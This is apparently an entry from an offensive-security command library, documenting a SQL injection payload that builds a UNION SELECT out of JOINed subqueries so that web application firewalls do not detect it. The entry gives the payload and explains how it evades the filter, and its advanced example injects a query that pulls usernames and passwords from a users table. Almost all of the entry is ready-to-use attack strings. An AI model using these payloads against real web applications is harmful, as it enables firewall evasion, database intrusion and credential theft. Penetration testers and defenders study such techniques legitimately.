---
type: command
executor: sql
data: >-
  UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT
  4)d
tags:
  - sql-injection
  - waf-bypass
platforms:
  - Web
verified: true
validated: true
---

# sql-union-select-with-joins-bypass

## Command

```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

## Description

Constructs a UNION SELECT with multiple columns using nested subqueries and JOINs to evade WAF detection of direct comma-separated values (e.g., UNION SELECT 1,2,3,4). Enables column matching in union-based SQLi for data exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| (SELECT 1)a | First subquery alias for column 1 | Yes |
| JOIN (SELECT 2)b | Second subquery for column 2 | Yes (repeat for additional columns) |
| * | Selects all columns from joined subqueries | Built-in |

## Examples

### Basic Usage

```sql
SELECT * FROM products WHERE id=1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b;
```

### Advanced Usage

```sql
' UNION SELECT * FROM (SELECT username FROM users)a JOIN (SELECT password FROM users)b --;
```

## Expected Output

Appends rows from the UNION, e.g., a row with values 1 and 2. Success: Injected data appears in the application's output without filtering.

## Related

- [[procedures/SQL-Injection-WAF-Bypass-with-OFFSET-FROM-and-JOIN]]
